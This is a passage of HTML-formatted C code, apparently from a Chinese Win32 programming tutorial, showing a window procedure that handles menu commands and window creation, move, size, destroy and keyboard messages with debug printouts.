分析菜单选择:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;wmId&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; IDM_EXIT&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token function&#34;&gt;DestroyWindow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hWnd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;DefWindowProc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hWnd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; message&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 如果不处理。则必须调用这个函数教给默认的窗口回调处理&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_CREATE&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_CREATE %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			CREATESTRUCT&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; createst &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;CREATESTRUCT&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;CREATESTRUCT %s\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;createst&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;lpszClass&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_MOVE&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_MOVE %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			POINTS points &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;MAKEPOINTS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;X Y %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;points&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;points&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_SIZE&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_SIZE %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; newWidth &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;short&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;LOWORD&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; newHeight &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;short&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;HIWORD&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_SIZE %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;newWidth&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;newHeight&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_DESTROY&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 销毁&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_DESTROY %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;PostQuitMessage&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// 键盘消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_KEYUP&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;99&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;100&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_KEYUP %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;101&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;102&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;103&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;104&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;105&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;106&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; WM_KEYDOWN&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;107&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;108&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;109&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;110&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token function&#34;&gt;DbgPrintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;WM_KEYDOWN %d %d\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;wParam&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;lParam&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;111&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;112&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;113&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;114&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;115&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;116&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// 鼠标消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;117&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		